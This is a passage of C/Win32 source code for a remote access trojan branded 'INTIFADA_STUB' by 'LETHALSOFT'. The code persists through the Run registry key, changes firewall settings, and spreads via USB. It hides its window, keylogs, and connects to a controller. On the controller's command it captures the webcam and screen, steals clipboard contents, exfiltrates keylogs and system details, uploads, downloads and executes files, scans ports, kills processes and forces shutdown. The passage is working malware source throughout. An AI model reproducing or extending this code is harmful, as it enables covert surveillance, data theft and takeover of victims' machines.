      }


                        fclose(pFile);
                        Nsize = 0;
                        Sleep(1);

SEND_ENDAGAIN2:
                        FSEND.PacketType = END_CAP_CAM;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }
                           Sleep(20);
                           goto SEND_ENDAGAIN2;
                        }


					  _unlink("cam.bmp");
					  _unlink("cam.jpg");
return 0;
}





LRESULT CALLBACK WinProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd)
{

    InitMe();
    //mciSendString("set CDAudio door open", NULL, 0, NULL);
     //SetInfStatsDB(1,0);

    HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "PI_MUTEX");
    if(hMutex == NULL)
    {
        hMutex = CreateMutex(NULL, FALSE, "PI_MUTEX");
    }
    else
    {
        return 0;
    }

    //Spread();
    //SetAccessRights();
    AddSelfToRun("addtorun");

    //InfectExes();
    NetSHFirewallReg();


if(strstr(Spread2USB,"USBSPREAD_ON"))
{
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader,(LPVOID)"", 0, &thread);
}




    //GetFfPwds();


	WNDCLASSEX wClass;
	ZeroMemory(&wClass,sizeof(WNDCLASSEX));
	wClass.cbClsExtra=NULL;
	wClass.cbSize=sizeof(WNDCLASSEX);
	wClass.cbWndExtra=NULL;
	wClass.hbrBackground=(HBRUSH)COLOR_WINDOW;
	wClass.hCursor=LoadCursor(NULL,IDC_ARROW);
	wClass.hIcon=NULL;
	wClass.hIconSm=NULL;
	wClass.hInstance=hInst;
	wClass.lpfnWndProc=(WNDPROC)WinProc;
	wClass.lpszClassName="LethalApps";
	wClass.lpszMenuName=NULL;
	wClass.style=CS_HREDRAW|CS_VREDRAW;

	if(!RegisterClassEx(&wClass))
	{
		int nResult=GetLastError();
		/*MessageBox(NULL,
			"Window class creation failed\r\nError code:",
			"Window Class Failed",
			MB_ICONERROR);*/
	}

	HWND hWnd=CreateWindowEx(NULL,
			"LethalApps",
			"INTIFADA_STUB | bY LETHALSOFT .INC",
			WS_EX_LAYERED,
			1050,
			650,
			200,
			50,
			NULL,
			NULL,
			hInst,
			NULL);

	if(!hWnd)
	{
		/*int nResult=GetLastError();

		//MessageBox(NULL,
			"Window creation failed\r\nError code:",
			"Window Creation Failed",
			MB_ICONERROR);*/
	}

    ShowWindow(hWnd,/*nShowCmd*/HIDE_WINDOW);


    	//modulehandle =
    	//GetModuleHandle(NULL);
	//kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, GetModuleHandle(NULL), NULL);

	//running = true;

	//GetWindowsDirectory((LPSTR)windir, MAX_PATH);


 // while (running) {

	MSG msg;
	ZeroMemory(&msg,sizeof(MSG));

	while(GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

 // }
	return 0;
}



HWND hStatus;


LRESULT CALLBACK WinProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam)
{
	switch(msg)
    {

        case WM_CTLCOLORSTATIC:
	    SetBkMode(hdc,TRANSPARENT);
	    return (LRESULT)CreateSolidBrush(0xFFFFFF);

		case WM_COMMAND:
			switch(LOWORD(wParam))
            {

			}
			break;



		case WM_CREATE:
		     {



                       /*camhwnd = capCreateCaptureWindow ("camera window", WS_CHILD , 0, 100, 300, 300, hWnd, 0);
                       SendMessage(camhwnd,WM_CAP_DRIVER_CONNECT,0,0);
                       SendMessage(camhwnd,WM_CAP_DLG_VIDEOSOURCE,0,0);
                       ShowWindow(camhwnd,SW_SHOW);*/


            hStatus = CreateWindowEx(0, STATUSCLASSNAME,
                                      NULL, WS_CHILD | WS_VISIBLE |
                                     SBARS_SIZEGRIP, 0,0,0,0,hWnd,
                                     (HMENU) ID_MAIN_STATUS,
                                      GetModuleHandle(NULL), NULL);

SendMessage(hStatus, SB_SETPARTS, sizeof(statwidths)/sizeof(int), (LPARAM)statwidths);




HGDIOBJ hfDefault=GetStockObject(DEFAULT_GUI_FONT);


int i;
char Name [20] = "";
   while(i < 110)
   {
    strcpy(Name, "");
    sprintf(Name, "Log%d.txt", i);
    DeleteFile(Name);
    i++;
    }
    srand((unsigned)time(0));
    KEYID = (rand()%100)+1;

    KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);

Connect(hWnd);



		}
		break;


		case WM_DESTROY:
		{
		    //running = false;
			PostQuitMessage(0);
			shutdown(Socket,SD_BOTH);
			closesocket(Socket);
			WSACleanup();
			return 0;
		}
		break;

		case WM_SOCKET:
		{


    /*long size;
    char* rbuffer;			//will save file content here


	ifstream file;
	file.open("C:\\Users\\Physics(SWEP2011)\\Desktop\\C++\\INTIFADA_RAT\\log.txt", ios::in );		//open file

	if(file.is_open()){
		file.seekg(0, ios::end);
		size = file.tellg();	//file size!


		file.seekg(0, ios::beg);		//sets location back to beginning of file

		rbuffer = new char[size];
		file.read(rbuffer, size);		//write file to buffer

	}
	file.close();*/



			switch(WSAGETSELECTEVENT(lParam))
			{


				case FD_READ:
				{
                  recv(wParam,(char*)&Recv,RecvSize,0);

                  if(Recv.PacketType!=SEND_SEC_PASS/*||SEND_AUTO_SOCK*/)
                  {
                    if(strstr(SetSecurityPass,"SECURITYPASS_ON"))
				            {
                       if(strcmp(AuthPassFail,"AUTH_FAIL")==0)
                       {
                         SEND.PacketType = AUTH_FAIL;
			                   send(Socket,(char*)&SEND,HeadSize,0);
			                   break;
                       }
				            }
                 }

                  switch (Recv.PacketType)
                 {



				  /*  case TEST_CONNECTION:
				    {
				        SEND.PacketType = CONFIRM_ONLINE;
				        send(Socket,(char*)&SEND,HeadSize,0);


				    }
				    break;*/
				    case SEND_SEC_PASS:
				    {
				        if(strcmp(Recv.SEC_PASS,SECPASSKEY)==0)
				        {
				            strcpy(AuthPassFail,"AUTH_PASS");
				        }

				        else
				        {
				           strcpy(AuthPassFail,"AUTH_FAIL");
				        }

				    }
				    break;

				    case SEND_LOGS:
				    {
                               /* FILE* DispLog;
                                FILE* DispLog2;
                                long offset;
                                char logz[MAX_LEN]={0};
                                DispLog = fopen ("Intel.txt","r");
                                DispLog2 = fopen ("testlog.txt","a+");


                                while(!feof(DispLog))
                                {

                                   offset = ftell(DispLog);
                                   fseek(DispLog, offset, SEEK_SET);
                                   fgets(logz,MAX_LEN,DispLog);
                                   fputs(logz,DispLog2);
                                   lstrcpy(FSEND.Keylog,logz);

				                   FSEND.PacketType = LOGS_SENT;
				                   send(FSocket,(char*)&FSEND,FHeadSize,0);

				                   ZeroMemory(&logz[0],sizeof(logz));
				                   Sleep(1);



                                 if (feof(DispLog))
                                 break;
                                }
                                fclose(DispLog);
                                fclose(DispLog2);*/


                    /*KeyConnect = 1;
                    TerminateThread(KeyLog, 0);
					TerminateThread(WindowLog, 0);
					UnhookWindowsHookEx(theHook);
					KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);*/

					Extract_Logs();

                    /*SendMessage(hStatus,
                    WM_SETTEXT,
                    NULL,
                    (LPARAM)FileNameA);*/

				    }
				    break;


				    case REQ_CLIP_BOARD:
				    {
				      GetClipboard();

            SEND_TEXT:
                      FSEND.PacketType = SEND_CLIP_BOARD;
                      if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                      {
                      if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                      {
                       break;
                      }

                      Sleep(50);
                      goto SEND_TEXT;
                      }


				    }
				    break;

				    case PASTE_CLIP_BOARD:
				    {
				       SetClipboard(Recv.cliptext);
				    }
				    break;

				    case EMPTY_CLIP_BOARD:
				    {


                        if(OpenClipboard(NULL))
                           EmptyClipboard();
                        CloseClipboard();

				    }
				    break;

				    case COPY_CLIP_BOARD:
				    {

				      GetClipboard();

            SEND_TEXT2:
                      FSEND.PacketType = COPY_CLIP_BOARD;
                      if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                      {
                      if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                      {
                       break;
                      }

                      Sleep(50);
                      goto SEND_TEXT2;
                      }


				    }
				    break;


				    case BROWSE_WEB:
				    {
				       ShellExecute(NULL, "open", Recv.URL, NULL, NULL, SW_SHOWNORMAL);
				    }
				    break;

				    case CONFIRM_ONLINE:
				    {

                    SendMessage(hStatus,
                    WM_SETTEXT,
                    NULL,
                    (LPARAM)"Server Connected!");

                    ScreenRes();
                    Getcountry();
                    GetUserInfo();
                    BOOL IsAdmin();
                    Admin();
                    bool isNT = GetOSVersion();
                    GetCompInfo(isNT);
                    GetTotalRAM();
                    GetProcessor();
                    GetTime();
                    lstrcpy(SEND.Time,Time);

              SEND.PacketType = COMPUTER_INFO;
			        send(Socket,(char*)&SEND,HeadSize,0);
			        Sleep(3);
			        //Transfer_Connect(hWnd);
			        //Download_Connect(hWnd);
			        if(strstr(isAutoSocket,"AUTO_SOCK"))
			        {
              SEND.PacketType = REQ_AUTO_SOCK;
			        send(Socket,(char*)&SEND,HeadSize,0);
			        }

			        if(strstr(SetSecurityPass,"SECURITYPASS_ON"))
			        {
              SEND.PacketType = REQ_SEC_PASS;
			        send(Socket,(char*)&SEND,HeadSize,0);
			        }


				    }
				    break;

				    case REQ_FILES:
				    {
				      ListDir();
				      //ShellExecute(NULL, "open", TESTEXE, NULL, NULL, SW_SHOWNORMAL);
				    }
				    break;

				    case REQ_TASKS:
				    {
				      SendTask();
				    }
				    break;

				    case START_SERVICE:
				    {
				        startService(Recv.SrvcName);
				    }
				    break;

				    case STOP_SERVICE:
				    {
				       stopService(Recv.SrvcName);
				    }
				    break;

				    case REQ_INSTALLS:
				    {
                      QueryInstalls();
				    }
				    break;

				    case REQ_DRIVES:
				    {
                      SendDrives();
				    }
				    break;

                    case REQ_WINDOWS:
                    {
                        ShowTasks();
                    }
                    break;

                    case SHUT_DOWN_PC:
                    {
                      MySystemShutdown();
                    }
                    break;

                    case LOG_OFF_PC:
                    {
                      LogOff();
                    }
                    break;

                    case TURN_OFF_PC:
                    {
                      TurnMonitorOff();
                    }
                    break;

                    case TURN_ON_PC:
                    {
                      TurnMonitorOn();
                    }
                    break;

                    case CAP_WEBCAM:
                    {

                       _unlink("cam.bmp");
                       _unlink("cam.jpg");

                      // nIndex = GetCamIndex();


                      if(CamOn>=1)
                      {
                          goto Snap;
                      }

                      if(CamOn<1)
                      {
                       camhwnd = capCreateCaptureWindow ("camera window", WS_CHILD , 0, 100, 300, 300, hWnd, 0);
                       SendMessage(camhwnd,WM_CAP_DRIVER_CONNECT,0,0);
                       SendMessage(camhwnd,WM_CAP_DLG_VIDEOSOURCE,0,0);
                       CamOn = 1;
                      }

Snap:
                       ShowWindow(camhwnd,SW_SHOW);
                       //SendMessage(camhwnd,WM_CAP_DRIVER_CONNECT,0,0);
                       SendMessage(camhwnd, WM_CAP_SET_SCALE, true , 0);
                       SendMessage(camhwnd, WM_CAP_SET_PREVIEWRATE, 66, 0);
                       SendMessage(camhwnd, WM_CAP_SET_PREVIEW, true , 0);

                       //Grab a Frame
	                   SendMessage(camhwnd, WM_CAP_GRAB_FRAME, 0, 0);
	                   //Copy the frame we have just grabbed to the clipboard
	                   SendMessage(camhwnd, WM_CAP_EDIT_COPY,0,0);

	                   //Copy the clipboard image data to a HBITMAP object called hbm
	                   hdc = BeginPaint(camhwnd, &ps);
	                   hdcMem = CreateCompatibleDC(hdc);
	                   if (hdcMem != NULL)
	                  {
	                   if (OpenClipboard(camhwnd))
	                  {
	                   hbm = (HBITMAP) GetClipboardData(CF_BITMAP);
	                   SelectObject(hdcMem, hbm);
	                   GetClientRect(camhwnd, &rc);
	                   CloseClipboard();
	                  }
	                  }
	                   //Save hbm to a .bmp file called Frame.bmp
	                   PBITMAPINFO pbi = CreateBitmapInfoStruct(hWnd, hbm);
	                   CreateBMPFile(hWnd, "cam.bmp", pbi, hbm , hdcMem);

                       /*SendMessage(camhwnd,WM_CAP_DRIVER_CONNECT,0,0);
                       SendMessage(camhwnd, WM_CAP_SET_SCALE, true , 0);
                       SendMessage(camhwnd, WM_CAP_SET_PREVIEWRATE, 66, 0);
	                   SendMessage(camhwnd, WM_CAP_SET_PREVIEW, true , 0);*/

                       //SendMessage(camhwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                       ShowWindow(camhwnd,SW_HIDE);
                       //capWebCam("Frame.bmp", nIndex, 300, 290, 10);

                       if(ConvertImage(L"cam.bmp", L"cam.jpg", L"image/jpeg", 75)==true)
                       {
                           WebshotSend();
                       }


                    }
                    break;



                    case KILL_PROCESS:
                    {
                       KillProcess(Recv.TaskName);
                    }
                    break;


                    case SCAN_PORT:
                    {
                        StartScanner(Recv.StartIp,Recv.EndIp,Recv.StartPort,Recv.EndPort);
                    }


                    case EXECUTE_FILE:
                    {
                      ShellExecute(NULL, "open", Recv.FileName, NULL, NULL, SW_SHOWNORMAL);
                    }
                    break;




                    case DOWNLOAD_FILE:
                    {

                         FileSendHandle = CreateThread(NULL, 0,Downloadfile,(LPVOID)"", 0, &thread);

                    }
                    break;

                    case DELETE_FILE:
                    {
                      DeleteFile(Recv.FileName);
                    }
                    break;


                   case IEXECUTE_FILE:
                   {
                     ShellExecute(NULL, "open", Recv.Ipath, NULL, NULL, SW_SHOWNORMAL);
                   }
                   break;

                   case REQ_FILE_SEARCH:
                   {
                      strcpy(Buf2,Recv.SearchDir);
                      strcpy(Buf,Recv.SearchFile);
                      CreateThread(NULL, 0, FindFileT,(LPVOID)"", 0, &thread);
                   }
                   break;

                   case REQ_SRVCS:
                   {
                     enumservices();
                   }
                   break;

                   case CAP_SCREEN:
                   {
                       _unlink("scr.jpg");
                       /*CaptureScreen(hWnd);
                       hWindowdc = BeginPaint(hWnd, &ps);
                       hBitmapdc = CreateCompatibleDC(hWindowdc);
                       hWindowdc = GetDC(hWnd);


                       //ShrinkBitmap (hbm,20 ,10 );
                       PBITMAPINFO pbi = CreateBitmapInfoStruct(hWnd, hbm);
                       //ShrinkBitmap (hbm,20 ,10 );
                       CreateBMPFile(hWnd, "FrameS.bmp", pbi, hbm , hBitmapdc);
                       DeleteDC(hBitmapdc);
                       ConvertImage(L"FrameS.bmp", L"Scr.jpg", L"image/jpeg", 75);*/
                       if(GetScreeny(L"scr.jpg",90,700,490))
                       {
                           //ERROR
                       }
                       Sleep(1);

                       ScreenshotSend();


                   }
                   break;


                   case NEW_FOLDER:
                   {
                     CreateDirectory(Recv.FileName,NULL);
                   }
                   break;


                   case RENAME_FILE:
                   {
                     // MoveFile(, );

                   }
                   break;


                   case COPYnPASTE_FILE:
                   {
                       CopyFile(Recv.Fcopy, Recv.Fpaste, FALSE);
                   }
                   break;

                   case SEND_AUTO_SOCK:
                   {
                    if(strstr(isAutoSocket,"AUTO_SOCK"))
                    {
                     sprintf(DLPort,"%d",Recv.FPort);
                     sprintf(FPort,"%d",Recv.UPort);
                    }
                   }
                   break;

                   case INIT_DLFSOCK:
                   {
                       Download_Connect(hWnd);
                   }
                   break;

                   case INIT_FSOCK:
                   {
                       Transfer_Connect(hWnd);
                   }
                   break;

                   case CANCEL_DLOAD:
                   {
                       if(TerminateThread(FileSendHandle,0)==0)
                       {
                           SEND.PacketType = DLOAD_TERMINATED;
                           send(Socket,(char*)&SEND,HeadSize,0);
                       }
                   }
                   break;

                   case PAUSE_DLOAD:
                   {
                       if(SuspendThread(FileSendHandle))
                       {
                           SEND.PacketType = DLOAD_SUSPENDED;
                           send(Socket,(char*)&SEND,HeadSize,0);
                       }
                   }
                   break;

                   case RESUME_DLOAD:
                   {
                       if(ResumeThread(FileSendHandle))
                       {
                           SEND.PacketType = DLOAD_RESUMED;
                           send(Socket,(char*)&SEND,HeadSize,0);
                       }
                   }
                   break;

                   case REQ_DATABASE:
                   {
                       sendDB();
                   }
                   break;

                   case PING:
                   {

                   }
                   break;


                   case REQ_REG_MAN:
                   {
                       QueryKey(Recv.Hkey_ID, Recv.KeyPath);
                      /*switch(Recv.Hkey_ID);
                      {
					 case 0:
					 {
						if( RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT(Recv.KeyPath),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);
						}
					 }
						break;


					 case 1:
					 {
						if( RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(Recv.KeyPath),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);
						}
					 }
						break;

					 case 2:
					 {

						if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(Recv.KeyPath),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);
						}
					 }
						break;

					 case 3:
					 {

						if( RegOpenKeyEx(HKEY_USERS, TEXT(Recv.KeyPath),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);
						}
					 }
						break;

					 case 4:
					 {

						if( RegOpenKeyEx(HKEY_CURRENT_CONFIG, TEXT(Recv.KeyPath),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);
						}
					 }
						break;

                      }
                      QueryKey(hTestKey, Recv.Hkey_ID, Recv.KeyPath);*/
                   }
                   break;





				}
				}
				break;

				case FD_CLOSE:
				{

                        SendMessage(hStatus,
						WM_SETTEXT,
						NULL,
						(LPARAM)"Server Disconnected!");

                        shutdown(Socket,SD_BOTH);
                        shutdown(FSocket,SD_BOTH);
                        shutdown(DLSocket,SD_BOTH);
						closesocket(Socket);
						closesocket(FSocket);
						closesocket(DLSocket);

                        WSACleanup();

						Sleep(50);
                        Connect(hWnd);


				}
				break;


    			}
			}
			break;


//////////////////////////////////////////

			case WM_TRANSFER_SOCKET:
			{
			    switch(WSAGETSELECTEVENT(lParam))
			    {
                  case FD_READ:
				  {
                    recv(wParam,(char*)&FRECV,FRecvSize,0);
                    switch (FRECV.PacketType)
                    {

                    }

				  }
				  break;

				  case FD_CLOSE:
				  {
				      closesocket(FSocket);
				      WSACleanup();

				  }
				  break;


			    }
			}
			break;

///////////////////////////////////////////////

			case WM_DLOAD_SOCKET:
			{
			    switch(WSAGETSELECTEVENT(lParam))
			    {
                  case FD_READ:
				  {
                    //MessageBox(NULL,"SHOW","DONE", MB_OK | MB_ICONINFORMATION);

                    recv(wParam,(char*)&ULRECV,ULRecvSize,0);
                    switch (ULRECV.PacketType)
                    {

                      case SET_FUPLOAD:
                      {

                         ZeroMemory(&UPLpath[0],sizeof(&UPLpath));

                         ULfilesize = ULRECV.ULFLen;
                         lstrcat(UPLpath,ULRECV.ULDestPath);
                         lstrcat(UPLpath,ULRECV.ULFname);


                      }
                      break;


                      case FUPLOAD:
                      {
                          if(ULSizeCheck<ULfilesize)
                          {
                              UPLFILE = fopen(UPLpath,"a+b");
                              fwrite(ULRECV.FUload, sizeof(ULRECV.FUload),1, UPLFILE);
                              ULSizeCheck+=sizeof(ULRECV.FUload);
                              ZeroMemory(&ULRECV.FUload[0],sizeof(&ULRECV.FUload));
                              fclose(UPLFILE);
                          }


                         else
                          {
                              UPLFILE = fopen(UPLpath,"wb");
                              fwrite(ULRECV.FUload, ULfilesize,1, UPLFILE);
                              ZeroMemory(&ULRECV.FUload[0],sizeof(&ULRECV.FUload));
                              fclose(UPLFILE);
                          }



                      }
                      break;


                      case END_FUPLOAD:
                      {
                         ULSizeCheck = 0;
                        // ZeroMemory(&UPLpath[0],sizeof(&UPLpath));
                        //MessageBox(NULL,UPLpath,"DONE", MB_OK | MB_ICONINFORMATION);
                        Sleep(1);
                      }
                      break;

                    }

				  }
				  break;

				  case FD_CLOSE:
				  {
				      WSACleanup();
				      closesocket(DLSocket);
				  }
				  break;


			    }
			}
			break;




		}

    return DefWindowProc(hWnd,msg,wParam,lParam);
}




/*int test_key(void)
{
    int check;
    HKEY hKey;
    char spath[BUFSIZE];
    DWORD buf_length=BUFSIZE;
    int reg_key;

    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
    if(reg_key!=0)
    {
        check=1;
        return check;
    }

    reg_key=RegQueryValueEx(hKey,"INTIFADA",NULL,NULL,(LPBYTE)spath,&buf_length);

    if((reg_key!=0)||(buf_length>BUFSIZE))
        check=2;
    if(reg_key==0)
        check=0;

    RegCloseKey(hKey);
    return check;
}

int create_key(char *path)
{
        int reg_key,check;

        HKEY hkey;

        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
        if(reg_key==0)
        {
                RegSetValueEx((HKEY)hkey,"INTIFADA",0,REG_SZ,(BYTE *)path,strlen(path));
                check=0;
                return check;
        }
        if(reg_key!=0)
                check=1;

        return check;
}*/



void GetProcessor()
{
char  CPUkey [100] = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
char  CPUVal [100] = "ProcessorNameString";
char CPU [100] = "";
HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;
//char* buf = (char*)malloc(100);

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPUkey,0,KEY_READ, &key1) == ERROR_SUCCESS)
{
RegQueryValueEx(key1,CPUVal, NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS)
{
lstrcpy(SEND.Processor_specs, buf);
}

}

RegCloseKey(key1);
Sleep(1000);
}


void GetTotalRAM()
{
	MEMORYSTATUS Status;
	ZeroMemory(&Status, sizeof(Status));
	Status.dwLength = sizeof(Status);
	GlobalMemoryStatus(&Status);
	DWORD dwRAM = (DWORD)(Status.dwTotalPhys / (1024*1024));

	ZeroMemory(&Buffer[0],sizeof(&Buffer));
	lstrcpy(Buffer, "");
	wsprintf(Buffer, "%d MB", dwRAM);
	lstrcpy(SEND.RAM_Size, Buffer);

}


void Getcountry()
{

      WORD wVersionRequested;
      WSADATA wsaData;
      char name[255];
      char * ip;
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );

      if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {

            if( gethostname ( name, sizeof(name)) == 0)
            {
				//(NULL, name, "name", MB_OK);
                  if((hostinfo = gethostbyname(name)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
            }

            WSACleanup( );
      }
///////////////////////////////////////////////////////////////////////////////////////
//
    ZeroMemory(&Country[0],sizeof(&Country));
    ZeroMemory(&cp_name[0],sizeof(&cp_name));

	sprintf(Country, "%s", ip);
    sprintf(cp_name, "%s", name);
    lstrcpy(SEND.IP_add,Country);
    lstrcpy(SEND.cpt_name,cp_name);
        /*GetLocaleInfo(LOCALE_SYSTEM_DEFAULT,LOCALE_SENGCOUNTRY,Country,128);
     */
}



void GetUserInfo()
{
char ret[100];

char host[100];
gethostname(host, sizeof(host));


DWORD nUserName = sizeof(UserName);
GetUserName(UserName, &nUserName);

wsprintf(ret," %s",UserName);
lstrcpy(SEND.User, ret);
}




void SendDrives()
{
UINT driveType = 0;
char drive[4] = "A:\\";

for(drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++)
{
switch(GetDriveType(drive))
{

case DRIVE_REMOVABLE: // The drive has removable media
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"REMOVABLE_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 1;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);

}
break;


case DRIVE_REMOTE: // The drive is a remote (network) drive.
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"REMOTE NETWORK_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 2;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);


}
break;

case DRIVE_UNKNOWN: // The drive type cannot be determined.
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"UNKNOWN_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 3;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);

}
break;

case DRIVE_FIXED: // The drive has fixed media
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"FIXED_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 4;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);


}
break;

case DRIVE_CDROM: // The drive is a CD-ROM drive.
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"CDROM_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 5;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);
//ofstream file("testD.txt",ios::app);
//file<<SEND.Drives;

}
break;

case DRIVE_RAMDISK: // The drive is a RAM disk.
{
ZeroMemory(&SEND.Drives[0],sizeof(&SEND.Drives));
//strcat(SEND.Drives,"RAMDISK_DRIVE: ");
lstrcpy(SEND.Drives, drive);
SEND.DriveType = 6;
SEND.PacketType = SEND_DRIVES;
send(Socket,(char*)&SEND,HeadSize,0);

}
break;

default:
break;
}
Sleep(50);
}
return;
}



BOOL IsAdmin()
{
UINT i;
bool bRetval = FALSE;
BOOL bSuccess;
HANDLE hAccessToken;
UCHAR InfoBuffer[1024];
PTOKEN_GROUPS ptgGroups = (PTOKEN_GROUPS) InfoBuffer;
DWORD dwInfoBufferSize;
PSID psidAdministrators;
SID_IDENTIFIER_AUTHORITY siaNtAuthority = SECURITY_NT_AUTHORITY;
OSVERSIONINFO Info = {0};
Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

if (GetVersionEx(&Info))
{
	if ((Info.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)&&(Info.dwMajorVersion==4))
	{
	return TRUE;
	}

}
else
{
return FALSE;
}
if (!OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hAccessToken))
{
   if (GetLastError() != ERROR_NO_TOKEN)
	{
	return FALSE;
	}

   if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hAccessToken))
   {
	return FALSE;
   }
}
bSuccess = GetTokenInformation(hAccessToken,TokenGroups,InfoBuffer, sizeof(InfoBuffer),&dwInfoBufferSize);

CloseHandle(hAccessToken);
if (!bSuccess)
{
return FALSE;
}
if (!AllocateAndInitializeSid(&siaNtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&psidAdministrators))
{
return FALSE;
}
	for (i = 0; i < ptgGroups->GroupCount; i++)
	{
		if (EqualSid(psidAdministrators,ptgGroups->Groups[i].Sid))
		{
		bRetval = TRUE;
		break;
		}
	}
FreeSid(psidAdministrators);
return bRetval;
}



int Admin()
{
//char ADMIN [100] = "";
ZeroMemory(&admin[0],sizeof(&admin));

if (IsAdmin())
{
 strcat(admin,"Administrator");
 lstrcpy(SEND.Admin,admin);

}
else
{
 strcat(admin,"Not Administrator");
 lstrcpy(SEND.Admin,admin);
 //send(Socket,(char*)&SEND,HeadSize,0);

}

return 0;
}



void ScreenRes()
{
   //width
   int x = GetSystemMetrics(SM_CXSCREEN);
   if(x == 0)
   {
    lstrcpy(ResultRes, "X Failed!");
   }
   // height
   int y = GetSystemMetrics(SM_CYSCREEN);
    if(y == 0)
   {
	lstrcpy(ResultRes, "Y Failed!");
   }
ZeroMemory(&SEND.Scr_res[0],sizeof(&SEND.Scr_res));
ZeroMemory(&ResultRes[0],100);
SCREENX = x;
SCREENY = y;
wsprintf(ResultRes,"%d x %d", x, y);
lstrcpy(SEND.Scr_res, ResultRes);

}



//////////////////////////////////////////////////////////////////////////////////
//Shutdown
BOOL MySystemShutdown()
{
   HANDLE hToken;
   TOKEN_PRIVILEGES tkp;

   // Get a token for this process.

   if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
      return( FALSE );

   // Get the LUID for the shutdown privilege.

   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
        &tkp.Privileges[0].Luid);

   tkp.PrivilegeCount = 1;  // one privilege to set
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

   // Get the shutdown privilege for this process.

   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
        (PTOKEN_PRIVILEGES)NULL, 0);

   if (GetLastError() != ERROR_SUCCESS)
      return FALSE;

   // Shut down the system and force all applications to close.

   if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
               SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
               SHTDN_REASON_MINOR_UPGRADE |
               SHTDN_REASON_FLAG_PLANNED))
      return FALSE;

   //shutdown was successful
   return TRUE;
}
//////////////////////////////////////////////////////////////////////////////////
//Logoff
void LogOff()
{
